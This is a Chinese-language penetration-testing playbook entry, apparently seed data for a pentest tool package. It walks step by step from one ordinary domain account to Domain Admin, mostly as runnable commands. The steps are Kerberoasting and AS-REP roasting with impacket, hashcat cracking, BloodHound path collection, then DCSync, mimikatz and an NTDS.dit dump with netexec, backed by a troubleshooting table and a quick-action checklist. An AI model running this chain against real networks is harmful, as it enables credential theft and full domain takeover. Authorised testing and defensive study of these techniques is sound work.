# [种子] Kerberoasting → 离线破解 → DA

## 场景分类
渗透测试 / AD 攻击

## 目标概述
有一个普通域用户凭据，目标域内存在配置 SPN 的服务账户，通过 Kerberoasting 拿到 TGS 离线爆破，破出明文密码后查 BloodHound 路径直通 DA。

## 完整执行链路

1. 域内立足（任意普通用户，无需本地管理员）
2. 枚举 SPN
   ```bash
   GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 -request -outputfile tgs.hash
   ```
3. 看哪些账户配了 SPN（通常是 SQL Server / IIS / 自定义服务账户）
4. 离线破解
   ```bash
   hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
   ```
5. 破出某 svc 账户密码 → BloodHound 查这个账户的可达路径
6. 如果该账户在 Tier 0 组（Domain Admins / Server Operators / Backup Operators）→ 直接 DCSync
7. 如果不在但能 RDP/WinRM 上某关键机 → 进去用 mimikatz dump，链式打到 DA

## 踩坑记录

| 问题 | 原因 | 解决方案 | 耗时 |
|------|------|---------|------|
| GetUserSPNs 无返回 | 当前用户没有读 SPN 权限 | 任何普通域用户都可以；可能是 -dc-ip 错或 PreAuth 未通 | 20min |
| 破解几小时无果 | 密码强度高 | 1) 换字典（rockyou.txt + corp keywords）  2) 上 GPU（hashcat -d 1）  3) 试 OneRuleToRuleThemAll 规则集 | 数小时 |
| 拿到密码登录失败 | 凭据已过期或大小写敏感 | 先用 nxc 验证：`nxc smb dc.local -u svc -p 'Pass'` | 10min |
| BloodHound 没数据 | 数据采集时少了 GPO/ACL | `bloodhound-python -c All` 必须带 All；新版 BHCE 推荐 `--zip` | 30min |
| AS-REP Roasting 没找到目标 | 设了 "Do not require Kerberos preauth" 的账户少 | 用 `GetNPUsers.py` 单独跑：` -usersfile users.txt -no-pass` | 15min |

## 工具链发现

- **impacket-GetUserSPNs** 已是事实标准，比 PowerView 跨平台
- **netexec (nxc)** 是 CrackMapExec 继任，速度快，自带 spider_plus / lsassy / ntds 等模块
- **BloodHound Community Edition (BHCE)** 是新版，比旧 BloodHound 快很多
- **OneRuleToRuleThemAll** 规则集做密码爆破效果最好
- **bloodyAD** 是新生代 AD 工具，专攻"低权限利用 ACL 提权"

## 关键代码/命令

完整 Kerberoasting 流程：

```bash
# 1. 验证凭据
nxc smb 10.0.0.1 -u user -p 'Pass123' -d domain.local

# 2. 提取 TGS
GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 \
  -request -outputfile tgs.hash

# 3. AS-REP 顺手一打
GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 \
  -usersfile users.txt -no-pass -format hashcat \
  -outputfile asrep.hash

# 4. 离线爆破
hashcat -m 13100 tgs.hash rockyou.txt -r OneRuleToRuleThemAll.rule  # TGS-Rep
hashcat -m 18200 asrep.hash rockyou.txt                              # AS-Rep

# 5. 拿密码后采 BloodHound
bloodhound-python -u user -p 'Pass123' -d domain.local -ns 10.0.0.1 -c All --zip

# 6. 找路径：把 svc 账户标记为 Owned，看 Shortest Path to DA
```

如果 svc 账户能访问 DC 上 SeBackupPrivilege：

```bash
nxc smb dc.domain.local -u svc -p 'CrackedPass' --ntds
# 直接 dump NTDS.dit
```

## 对本包的改进建议

- `pentest-tools/references/network-attack-defense.md` 应该有 Kerberoasting 完整章节
- BloodHound CE 已是主流，bootstrap-manifest 应明确装 `bloodhound-ce-cli`
- 增加 `pentest-tools/references/ad-cheatsheet.md` 把 6 大 AD 攻击（Kerberoasting / AS-REP / DCSync / DCShadow / Constrained Delegation / Resource-Based Constrained Delegation / ESC1-ESC15）一页搞定

## 可复用的模式/脚本片段

**域内立足后 30 分钟标准动作**：

```text
1. nxc smb 验凭据 + 自动 spider 共享
2. GetUserSPNs + GetNPUsers 一气
3. bloodhound-python -c All 采集
4. 同时离线爆破（GPU 跑着）
5. 边等边过 BloodHound 查 Tier 0 / Pre-built attack paths
6. 破出密码 → 标记 Owned → 重新查路径
```

**AD Kerberos hashcat mode 速查**：

| 模式 | 用途 |
|------|------|
| 13100 | Kerberos TGS-Rep (Kerberoasting) |
| 18200 | Kerberos AS-Rep (AS-REP Roasting) |
| 5500  | NetNTLMv1 |
| 5600  | NetNTLMv2 (Responder 抓到的) |
| 19600 | Kerberos TGS-Rep (AES128) |
| 19700 | Kerberos TGS-Rep (AES256) |

## 进化动作
- [ ] 增加 ad-cheatsheet.md
- [ ] tool-index 检查 nxc / bloodhound-ce / bloodyAD 状态
- [x] 路由矩阵已含 Kerberos / Kerberoasting

## 环境信息
- Kali 2026.x，impacket 0.12+, netexec 1.x, hashcat 6.2+
- 目标 AD: Windows Server 2019/2022, 域功能级别 2016+
- 攻击位置: 域内任意立足点（普通域用户）

## 脱敏要求
本条目为种子数据，基于公开 AD 攻击技术模式编写，不涉及真实目标域。
